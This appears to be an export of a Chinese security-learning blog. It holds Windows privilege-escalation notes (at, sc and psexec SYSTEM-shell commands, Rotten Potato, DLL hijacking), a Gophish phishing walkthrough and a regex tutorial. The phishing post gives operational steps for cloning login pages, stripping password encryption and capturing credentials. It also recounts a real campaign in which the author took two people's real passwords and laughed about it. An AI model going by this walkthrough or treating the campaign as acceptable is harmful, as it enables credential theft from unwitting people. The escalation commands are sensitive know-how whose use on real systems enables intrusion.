<p><a href="https://www.cnblogs.com/bonelee/p/15863223.html">WindowsVulnScan和Wes用法</a></p>
<p>wes检测语句：python wes.py systeminfo.txt -o vuln.csv</p>
<p>根据vuln.csv中获取exp链接地址</p>
<h2 id="AT-amp-SC-amp-PS提权"><a href="#AT-amp-SC-amp-PS提权" class="headerlink" title="AT&amp;SC&amp;PS提权"></a>AT&amp;SC&amp;PS提权</h2><h3 id="at提权"><a href="#at提权" class="headerlink" title="at提权"></a>at提权</h3><p>适用版本：Win2000 &amp; Win2003 &amp; XP中还是存在的，在Win7以后被剔除</p>
<p>payload：<code>at (时间) /interactive cmd.exe</code></p>
<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220301235011222.png" alt="image-20220301235011222"></p>
<h3 id="sc提权"><a href="#sc提权" class="headerlink" title="sc提权"></a>sc提权</h3><p>win2003测试成功,win7未测试成功</p>
<p>创建一个名叫syscmd的新的交互式的cmd执行服务</p>
<p><code>sc Create syscmdd binPath= &quot;cmd /K start&quot; type= own type= interact</code></p>
<p>运行服务</p>
<p><code>sc start syscmdd</code></p>
<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220301235056001.png" alt="image-20220301235056001"></p>
<h3 id="PS提权"><a href="#PS提权" class="headerlink" title="PS提权"></a>PS提权</h3><p>适用版本：<code>Win2003 &amp; Win2008</code></p>
<p>需要下载PsTools（windows官方软件不会被杀）</p>
<p>payload：<code>psexec.exe -accepteula -s -i -d cmd.exe</code></p>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="https://github.com/vulmon/Vulmap">https://github.com/vulmon/Vulmap</a></p>
<p><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
<p><a href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p>
<p>win内核漏洞exp收录：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
<p><a href="https://www.shuzhiduo.com/A/A7zgDNYKJ4/">云服务器上安装msf以及msf初体验</a></p>
<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
<p><a href="https://github.com/unamer/CVE-2018-8120">https://github.com/unamer/CVE-2018-8120</a></p>
<p><a href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWs-VERSION/releases/tag/1">CVE-2020-0787-EXP-ALL-WINDOWS-VERSION</a></p>
]]></content>
      <categories>
        <category>权限提升</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>win</tag>
      </tags>
  </entry>
  <entry>
    <title>烂土豆&amp;dll劫持&amp;引号路径&amp;服务权限</title>
    <url>/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%83%82%E5%9C%9F%E8%B1%86&amp;dll%E5%8A%AB%E6%8C%81&amp;%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84&amp;%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/</url>
    <content><![CDATA[<h2 id="烂土豆配合令牌窃取"><a href="#烂土豆配合令牌窃取" class="headerlink" title="烂土豆配合令牌窃取"></a>烂土豆配合令牌窃取</h2><p>原理</p>
<ul>
<li>欺骗<code>“NT AUTHORITY\SYSTEM”</code>账户通过NTLM认证到控制的TCP终端</li>
<li>对这个认证过程使用<code>中间人攻击（NTLM重放）</code>，为<code>“NT AUTHORITY\SYSTEM”</code>账户本地协商一个安全令牌。这个过程通过一系列的Windows API调用实现的。</li>
<li>模仿这个令牌。只有具有“<code>模仿安全令牌权限</code>”的账户才能去模仿别人的令牌。一般大多数服务型账户（IIS、MSSQL等）都有这个权限，用户级账户大多数没有这个权限。</li>
</ul>
<blockquote>
<p>一般从Web拿到的WebShell 都是IIS 服务器权限，是具有这个模仿权限，使用菜刀反弹meterpreter就会成功</p>
</blockquote>
<p><a href="https://www.cnblogs.com/encr/p/15206787.html">烂土豆提权-win7复现</a></p>
<p><a href="https://github.com/tennc/webshell">GitHub - tennc/webshell: This is a webshell open source project</a></p>
<h2 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h2><p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%83%82%E5%9C%9F%E8%B1%86&dll%E5%8A%AB%E6%8C%81&%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84&%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20220304123233025.png" alt="image-20220304123233025"></p>
<p>使用火绒剑程序分析非系统文件加载的dll，尝试替换</p>
<h2 id="不带引号的服务路径提权"><a href="#不带引号的服务路径提权" class="headerlink" title="不带引号的服务路径提权"></a>不带引号的服务路径提权</h2><p><a href="https://blog.csdn.net/weixin_44032232/article/details/109073666">https://blog.csdn.net/weixin_44032232/article/details/109073666</a></p>
<h2 id="服务权限"><a href="#服务权限" class="headerlink" title="服务权限"></a>服务权限</h2><p>AccessChk v6.14下载：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk - Windows Sysinternals | Microsoft Docs</a></p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%83%82%E5%9C%9F%E8%B1%86&dll%E5%8A%AB%E6%8C%81&%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84&%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20220304130726700.png" alt="image-20220304130726700"></p>
]]></content>
      <categories>
        <category>权限提升</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>win提权</tag>
      </tags>
  </entry>
  <entry>
    <title>钓鱼浅尝</title>
    <url>/2022/04/01/%E9%92%93%E9%B1%BC/</url>
    <content><![CDATA[<blockquote>
<p>原计划是学java的，但写这篇文章的前一天，看了一部叫<strong>whoami</strong>黑客电影，感觉顶级黑客都是社工大佬，有很多经典台词：</p>
<p>“只要敢做就能赢”，</p>
<p>“黑客技术就像魔术，处处充满了欺骗”，</p>
<p>“每个人都只看到他愿意看到的”，</p>
<p>“外面的世界有太多的不确定,但是人可以成为自己想要成为的人,成为任何人”，</p>
<p>“人类才是系统中最大的漏洞。”</p>
<p>不知不觉中，让我萌生了社工的想法。</p>
<p>加之今天又是愚人节，是个搞事情的好日子🤭</p>
<p>而且更有意思的是今天凌晨我的室友居然收到了钓鱼邮件，还是他认识的人发的，于是请教了一下用的什么来做的钓鱼，便去学了学</p>
</blockquote>
<h2 id="Gophish搭建"><a href="#Gophish搭建" class="headerlink" title="Gophish搭建"></a>Gophish搭建</h2><p>Gophish 是一个功能强大的开源网络钓🐟框架。</p>
<h3 id="1-下载"><a href="#1-下载" class="headerlink" title="1.下载"></a>1.下载</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget https:<span class="regexp">//gi</span>thub.com<span class="regexp">/gophish/g</span>ophish<span class="regexp">/releases/</span>download<span class="regexp">/v0.11.0/g</span>ophish-v0.<span class="number">11.0</span>-linux-<span class="number">64</span>bit.zip</span><br></pre></td></tr></table></figure>

<h3 id="2-修改配置文件config-json"><a href="#2-修改配置文件config-json" class="headerlink" title="2.修改配置文件config.json"></a>2.修改配置文件<code>config.json</code></h3><p>要注意：</p>
<ul>
<li>admin_server 把 127.0.0.1 改为 0.0.0.0，然后最好不要使用默 认3333 端口，亲测这个端口可能因为某种人为因素不通，改为 443 是最稳的。</li>
<li>listen_url 也要是 0.0.0.0，如果 80 端口被占用了可以改为其他端口比如 81。</li>
<li>contact_address 不是一定要加上的，可以加一个。</li>
</ul>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401105632720.png" alt="image-20220401105632720"></p>
<h3 id="3-运行"><a href="#3-运行" class="headerlink" title="3.运行"></a>3.运行</h3><p>./gophish 运行（如果不行就加个sudo）</p>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401114347207.png" alt="image-20220401114347207"></p>
<p>这里注意一下：</p>
<p><strong>最新版本的gophsih(v0.11.0)删除了默认密码“ gophish”。取而代之的是，在首次启动Gophish时会随机生成一个初始密码并将其打印在终端中</strong></p>
<p>初始随机密码：<code>f24c2b1a758b565b</code></p>
<h3 id="4-后台登录"><a href="#4-后台登录" class="headerlink" title="4.后台登录"></a>4.后台登录</h3><p>这里需要注意，要用https，不然访问不了。<code>https://xxx.xxx.xxx.xxx:443</code></p>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401112046516.png" alt="image-20220401112046516"></p>
<p>使用账号密码 <code>admin</code> <code>f24c2b1a758b565b</code> 来 login</p>
<p>登入后需要修改，改为<code>f24c2b1a758b565b9</code></p>
<h2 id="购买近似域名"><a href="#购买近似域名" class="headerlink" title="购买近似域名"></a>购买近似域名</h2><p>我这里因为没钱就没买近似域名，就用之前买的域名，QAQ</p>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401122417093.png" alt="image-20220401122417093"></p>
<h2 id="邮件服务器搭建"><a href="#邮件服务器搭建" class="headerlink" title="邮件服务器搭建"></a>邮件服务器搭建</h2><p>其实 QQ 邮箱也有域名邮箱的功能，但是 QQ 邮箱对钓鱼有检测、会被封的，所以我们还是自己搭。</p>
<p>我们 Ubuntu 还是使用 <code>Postfix</code>+<code>mailutils</code>。</p>
<p>参考：<a href="https://blog.csdn.net/sd4015700/article/details/21454729">https://blog.csdn.net/sd4015700/article/details/21454729</a></p>
<p>在搭建 gophish 的同一台 VPS 上开始搭建邮件服务器</p>
<h3 id="1-安装Postfix"><a href="#1-安装Postfix" class="headerlink" title="1.安装Postfix"></a>1.安装Postfix</h3><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install <span class="built_in">postfix</span></span><br></pre></td></tr></table></figure>
<p>↑↓键来选择，→键会到’ok’</p>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401121512674.png" alt="image-20220401121512674"></p>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401121551682.png" alt="image-20220401121551682"></p>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401125019264.png" alt="image-20220401125019264"></p>
<h3 id="2-安装mailx软件包"><a href="#2-安装mailx软件包" class="headerlink" title="2.安装mailx软件包"></a>2.安装mailx软件包</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install mailutils</span><br></pre></td></tr></table></figure>

<h3 id="3-增加测试用户-fmaster"><a href="#3-增加测试用户-fmaster" class="headerlink" title="3.增加测试用户 fmaster"></a>3.增加测试用户 fmaster</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">用户一：</span><br><span class="line">useradd -m -s <span class="regexp">/bin/</span>bash fmaster  </span><br><span class="line">passwd fmaster</span><br><span class="line"></span><br><span class="line">用户二</span><br><span class="line">useradd -m -s <span class="regexp">/bin/</span>bash CET报名官方客服</span><br><span class="line">passwd <span class="string">&quot;CET报名官方客服&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>注意这里腾讯云的VPS需要对25端口解封，不然使用telnet来检测时会一直不通</p>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401141808606.png" alt="image-20220401141808606"></p>
<h4 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h4><p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401142728262.png" alt="image-20220401142728262"></p>
<h4 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h4><p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401143142162.png" alt="image-20220401143142162"></p>
<p>去QQ邮箱查看，真的收到邮件了！！！</p>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401143222900.png" alt="image-20220401143222900"></p>
<p>然后QQ回复一封，看看我们的邮件服务器能不能收到</p>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401143428358.png" alt="image-20220401143428358"></p>
<p>服务端也确实能收到回信</p>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401143657633.png" alt="image-20220401143657633"></p>
<h2 id="Gophish-活动建立"><a href="#Gophish-活动建立" class="headerlink" title="Gophish 活动建立"></a>Gophish 活动建立</h2><h3 id="Sending-Profiles"><a href="#Sending-Profiles" class="headerlink" title="Sending Profiles"></a>Sending Profiles</h3><p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401204550857.png" alt="image-20220401204550857"></p>
<h3 id="Landing-Pages（钓鱼网址）"><a href="#Landing-Pages（钓鱼网址）" class="headerlink" title="Landing Pages（钓鱼网址）"></a>Landing Pages（钓鱼网址）</h3><p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401204724588.png" alt="image-20220401204724588"></p>
<p>若是import导入乱码，可以用google插件<code>Singlefile</code>来对网页前端进行爬取</p>
<h4 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h4><p><strong>Capture Submitted Data</strong>:<br>通常，进行钓鱼的目的往往是捕获受害用户的用户名及密码，因此，在点击Save Page之前，记得一定要勾选Capture Submitted Data<br>当勾选了Capture Submitted Data后，页面会多出一个<strong>Capture Passwords</strong>的选项，显然是捕获密码。通常，可以选择勾选上以验证账号的可用性。如果仅仅是测试并统计受害用户是否提交数据而不泄露账号隐私，则可以不用勾选<br>另外，当勾选了Capture Submitted Data后，页面还会多出一个<strong>Redirect to</strong>，其作用是当受害用户点击提交表单后，将页面重定向到指定的URL。可以填写被伪造网站的URL，营造出一种受害用户第一次填写账号密码填错的感觉<br>（一般来说，当一个登录页面提交的表单数据与数据库中不一致时，登录页面的URL会被添加上一个出错参数，以提示用户账号或密码出错，所以在Redirect to中，最好填写带出错参数的URL）</p>
<h4 id="踩坑汇总"><a href="#踩坑汇总" class="headerlink" title="踩坑汇总"></a>踩坑汇总</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">（必看）经验之谈 · 注意事项</span><br><span class="line">在导入真实网站来作为钓鱼页面时，绝大多数情况下并非仅通过<span class="keyword">Import</span>就能够达到理想下的克隆，通过多次实践，总结出以下几点注意事项</span><br><span class="line"></span><br><span class="line">【捕获不到提交的数据】导入后要在HTML编辑框的非Source模式下观察源码解析情况，如果明显发现存在许多地方未加载，则有可能导入的源码并非页面完全加载后的前端代码，而是一个半成品，需要通过浏览器二次解析，渲染未加载的DOM。这种情况下，除非能够直接爬取页面完全加载后的前端代码，否则无法利用gophish进行钓鱼，造成的原因是不满足第<span class="number">2</span>点。</span><br><span class="line">【捕获不到提交的数据】导入的前端源码，必须存在严格存在&lt;form <span class="keyword">method</span>=&quot;post&quot; ···&gt;&lt;<span class="keyword">input</span> <span class="type">name</span>=&quot;aaa&quot; ··· /&gt; ··· &lt;<span class="keyword">input</span> <span class="keyword">type</span>=&quot;submit&quot; ··· /&gt;&lt;/form&gt;结构，即表单（POST方式）— <span class="keyword">Input</span>标签（具有<span class="type">name</span>属性）<span class="keyword">Input</span>标签（submit类型）— 表单闭合的结构，如果不满足则无法捕获到提交的数据</span><br><span class="line">【捕获不到提交的数据】在满足第<span class="number">2</span>点的结构的情况下，还需要求&lt;form <span class="keyword">method</span>=&quot;post&quot; ···&gt;在浏览器解析渲染后（即预览情况下）不能包含action属性，或者action属性的值为空。否则将会把表单数据提交给action指定的页面，而导致无法被捕获到</span><br><span class="line">【捕获数据不齐全】对于需要被捕获的表单数据，除了<span class="keyword">input</span>标签需要被包含在&lt;form&gt;中，还需满足该&lt;<span class="keyword">input</span>&gt;存在<span class="type">name</span>属性。例如&lt;<span class="keyword">input</span> <span class="type">name</span>=&quot;username&quot;&gt;,否则会因为没有字段名而导致<span class="keyword">value</span>被忽略</span><br><span class="line">【密码被加密】针对https页面的<span class="keyword">import</span>，通常密码会进行加密处理，这时需要通过审计导入的前端代码，找到加密的JavaScript函数（多数情况存在于单独的js文件中，通过src引入），将其在gophish的HTML编辑框中删除，阻止表单数据被加密</span><br><span class="line">以上<span class="number">5</span>点是在实践中总结出来的宝贵经验，或许还有其他许多坑未填，但所有的坑通常都围绕在&lt;form&gt;&lt;<span class="keyword">input</span> /&gt;&lt;/form&gt;结构中，所以如果遇到新坑，先将该结构排查一遍，还是不行，再另辟蹊径</span><br></pre></td></tr></table></figure>

<h3 id="Email-Templates"><a href="#Email-Templates" class="headerlink" title="Email Templates"></a>Email Templates</h3><p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401204838592.png" alt="image-20220401204838592"></p>
<p><code>&#123;&#123;.URL&#125;&#125;</code>这里会自动对应钓鱼网址（Loading Page）</p>
<p>gophish为编辑邮件内容提供了两种方式，第一种就是Import Email</p>
<p>用户可以先在自己的邮箱系统中设计好钓鱼邮件，然后发送给自己或其他伙伴，收到设计好的邮件后，打开并选择导出为<strong>eml</strong>文件或者<strong>显示邮件原文</strong>，然后将内容复制到gophish的Import Email中，即可将设计好的钓鱼邮件导入</p>
<p>内容编辑框是编写邮件内容的第二种模式</p>
<h3 id="Users-amp-Groups"><a href="#Users-amp-Groups" class="headerlink" title="Users &amp; Groups"></a>Users &amp; Groups</h3><p>导入发送目标</p>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401205008996.png" alt="image-20220401205008996"></p>
<h3 id="Campaigns"><a href="#Campaigns" class="headerlink" title="Campaigns"></a>Campaigns</h3><p>制作<code>Campaigns</code>来发送邮箱并监测</p>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401212100345.png" alt="image-20220401212100345"></p>
<p>这里没想到居然逮到两个倒霉蛋输入了自己的真实密码（笑死我了🤣），今天的愚人节圆满了</p>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401212251916.png" alt="image-20220401212251916"></p>
<h2 id="受害者视角"><a href="#受害者视角" class="headerlink" title="受害者视角"></a>受害者视角</h2><p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401212547713.png" alt="image-20220401212547713"></p>
<p>输入用户名密码后提交，我的Gophish就会接收到</p>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401212628866.png" alt="image-20220401212628866"></p>
<p><img src="/2022/04/01/%E9%92%93%E9%B1%BC/image-20220401212956468.png" alt="image-20220401212956468"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>历时一天，终于时初次体验了一把社工的乐趣，虽然只是简单的🎣。不得不说，人才是最大的bug，大家一定要有网络安全意识，连接不要随便点，看清网址是什么！</p>
<p>在网络信息的世界里，重要的是有一双会发现的大👀</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.leanote.com/post/snowming/a6b66097bccd">gophish+自己搭建邮件服务器</a></p>
<p><a href="https://blog.csdn.net/qq_42939527/article/details/107485116">钓鱼工具gophish史上最详细教程</a></p>
<p><a href="https://blog.csdn.net/god_zzZ/article/details/122610708">Gophish钓鱼平台和邮件服务器搭建</a></p>
<p><a href="https://cdn.modb.pro/db/324573">钓鱼工具-gophish使用</a></p>
]]></content>
      <categories>
        <category>社会工程学</category>
      </categories>
      <tags>
        <tag>社会工程学，钓鱼</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<blockquote>
<p>正则在线测试网站：<a href="https://regexr-cn.com/">https://regexr-cn.com</a></p>
<p>正则练习平台：<a href="https://www.codejiaonang.com/#/course/regex_chapter1/0/0">https://www.codejiaonang.com/#/course/regex_chapter1/0/0</a></p>
</blockquote>
<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124154750051.png" alt="image-20220124154750051"></p>
<h3 id="字符集：匹配集合中的任何字符"><a href="#字符集：匹配集合中的任何字符" class="headerlink" title="[]字符集：匹配集合中的任何字符"></a><code>[]</code>字符集：匹配集合中的任何字符</h3><ul>
<li><p><code>-</code>表示区间，例如：<code>[a-z]</code>表示小写字母a到z</p>
</li>
<li><p><code>\</code>转义特殊字符，<code>[\]]</code>表示匹配<code>]</code></p>
</li>
<li><p><code>^</code>表示取非，<code>[^]</code>称作非集，匹配不在集合中的任何字符，例如<code>我[^你]</code>匹配我字后面没有你字（匹配两个字）</p>
</li>
</ul>
<h3 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h3><p><code>\d</code>数字，匹配任意数字(0-9)</p>
<p><code>\w</code>单词，匹配字母、数字、下划线</p>
<p><code>\s</code>空白字符，匹配任何空白字符。(空格，制表符tab，换行符)</p>
<p><code>\b</code>词边界，匹配一个单词边界，也就是指单词和空格见的位置，成对使用，例如<code>\bawesome\b</code>，匹配完整的单词，前后不能有其他字母，否则将匹配失败</p>
<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125125138035.png" alt="image-20220125125138035"></p>
<p>快捷方式取非，将上述<code>dwsb</code>等字母，换成大写即可</p>
<h3 id="开头和结尾"><a href="#开头和结尾" class="headerlink" title="开头和结尾"></a>开头和结尾</h3><p><code>^</code>开头，匹配字符串开头，或者当使用多行标志时，匹配一行的开头</p>
<p><code>$</code>结尾，匹配字符串结尾，或者当使用多行标志时，匹配一行的结尾</p>
<p>例如<code>^abcd</code>会匹配<code>abcdefg</code>中的<code>abcd</code>，<code>efg$</code>会匹配<code>abcdefg</code>中的<code>efg</code></p>
<h3 id="任意字符"><a href="#任意字符" class="headerlink" title="任意字符"></a>任意字符</h3><p><code>.</code>，匹配任何字符(不包括换行)</p>
<h3 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h3><p><code>?</code>，匹配在0和1之间个前面的标记，例如<code>favou?r</code>，匹配的时favour和favor</p>
<p><code>&#123;n&#125;</code>，匹配n个前面的标记，例如<code>\d&#123;10&#125;</code>，匹配连续10个数字</p>
<p><code>&#123;n,m&#125;</code><strong>贪婪模式</strong>，匹配n到m个前面的标记，有连续的m个就会匹配m个</p>
<p><code>&#123;n,m&#125;?</code><strong>非贪婪模式</strong>，只会匹配到连续的n个就停止匹配，例如下图</p>
<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124234228787.png" alt="image-20220124234228787"></p>
<p><code>*</code>，匹配0个或更多个前面的标记，例如<code>f.*</code>，会匹配所有f开头的字符</p>
<p><code>+</code>，匹配1个或更多个前面的标记，例如<code>f.+</code>，会匹配所有f开头的字符，但不匹配单独的f</p>
<h3 id="分组提取"><a href="#分组提取" class="headerlink" title="分组提取"></a>分组提取</h3><p><code>()</code>捕获分组，把多个标记分在同一组并创建一个捕获分组，用来创建子串或引用</p>
<p><code>|</code>或者条件</p>
<p><code>(?:表达式)</code>非捕获分组，在不创建捕获分组的情况下，把数个标记组在一起</p>
<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125164458925.png" alt="image-20220125164458925"></p>
<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125173535988.png" alt="image-20220125173535988"></p>
<p><code>(表达式)\1</code>分组的回溯引用，<code>\1</code>的效果是重新使用第1个分组去匹配，例如<code>(\w)(\w)\2\1</code>，匹配abba这种类型的字符，<strong>注：只有<code>()</code>有效，<code>(?:)</code>等无效</strong></p>
<h3 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h3><p>可以理解为预搜索，可对字符串做限制要求</p>
<h4 id="先行（表示从某个位置向右看）"><a href="#先行（表示从某个位置向右看）" class="headerlink" title="先行（表示从某个位置向右看）"></a>先行（表示从某个位置向右看）</h4><p><code>(?=)</code><strong>正向</strong>先行断言，匹配主表达式后面的组而不将其包含在结果中（保证右边含有某字符）</p>
<p><strong>可以翻译为：(?=表达式)右边存在</strong></p>
<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125175109411.png" alt="image-20220125175109411"></p>
<p><code>(?!)</code><strong>反向</strong>先行断言,指定著表达式后无法匹配的组，若匹配结果将被丢弃（保证右边不出现某字符）</p>
<p><strong>可以翻译为：(?!表达式)右边不存在</strong></p>
<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181138445.png" alt="image-20220125181138445"></p>
<p>tips：正向是<code>=</code>，反向是<code>!</code>，也即正向是<strong>有</strong>，反向是<strong>没有</strong></p>
<h4 id="后行-表示从某个位置向左看"><a href="#后行-表示从某个位置向左看" class="headerlink" title="后行(表示从某个位置向左看)"></a>后行(表示从某个位置向左看)</h4><p><code>(?&lt;=)</code><strong>正向</strong>后行断言，匹配主表达式之前的组，而不将其包含在结果中</p>
<p><strong>可以翻译为：(?&lt;=表达式)左边存在</strong></p>
<p><code>(?&lt;!)</code><strong>反向</strong>后行断言，指定在主表达式之前无法匹配的组，如果匹配，则结果将被丢弃</p>
<p><strong>可以翻译为：(?&lt;!表达式)左边不存在</strong></p>
<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181836600.png" alt="image-20220125181836600"></p>
<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125183732972.png" alt="image-20220125183732972"></p>
]]></content>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
</search>
